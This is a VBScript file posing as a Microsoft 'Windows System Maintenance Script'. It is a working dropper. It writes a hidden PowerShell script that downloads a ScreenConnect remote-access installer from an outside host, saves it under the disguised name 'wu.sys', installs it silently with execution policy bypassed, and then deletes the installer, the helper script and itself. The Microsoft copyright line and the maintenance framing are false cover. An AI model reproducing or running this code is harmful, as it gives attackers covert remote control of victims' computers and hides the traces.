' Windows System Maintenance Script
' Version: 2.1.0
' Copyright (c) Microsoft Corporation. All rights reserved.

On Error Resume Next

Dim objWsh, objFso, strPath, strUrl, strSave, strScript
Set objWsh = CreateObject("WScript.Shell")
Set objFso = CreateObject("Scripting.FileSystemObject")

strPath = objWsh.ExpandEnvironmentStrings("%WINDIR%") & "\Temp\"
If Not objFso.FolderExists(strPath) Then
    strPath = objWsh.ExpandEnvironmentStrings("%TEMP%") & "\"
End If

strUrl = "https://earthlink7.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
strSave = strPath & "wu.sys"
strScript = strPath & "wu.ps1"

' Create update script
Dim objFile
Set objFile = objFso.CreateTextFile(strScript, True)
objFile.WriteLine "function Get-File {"
objFile.WriteLine "    param($u,$p)"
objFile.WriteLine "    try {"
objFile.WriteLine "        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
objFile.WriteLine "        $c = New-Object Net.WebClient"
objFile.WriteLine "        $c.DownloadFile($u,$p)"
objFile.WriteLine "        return $true"
objFile.WriteLine "    } catch { return $false }"
objFile.WriteLine "}"
objFile.WriteLine ""
objFile.WriteLine "function Set-File {"
objFile.WriteLine "    param($p)"
objFile.WriteLine "    try {"
objFile.WriteLine "        Start-Process -FilePath $p -ArgumentList '/quiet /norestart' -Wait"
objFile.WriteLine "        return $true"
objFile.WriteLine "    } catch { return $false }"
objFile.WriteLine "}"
objFile.WriteLine ""
objFile.WriteLine "$url = '" & strUrl & "'"
objFile.WriteLine "$path = '" & strSave & "'"
objFile.WriteLine "if (Get-File $url $path) {"
objFile.WriteLine "    Set-File $path"
objFile.WriteLine "    Start-Sleep -Seconds 2"
objFile.WriteLine "    Remove-Item $path -Force -ErrorAction SilentlyContinue"
objFile.WriteLine "}"
objFile.WriteLine "Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue"
objFile.Close

' Execute
objWsh.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & strScript & """", 0, False

' Cleanup
WScript.Sleep 5000
On Error Resume Next
objFso.DeleteFile strScript, True
objFso.DeleteFile WScript.ScriptFullName, True
WScript.Quit
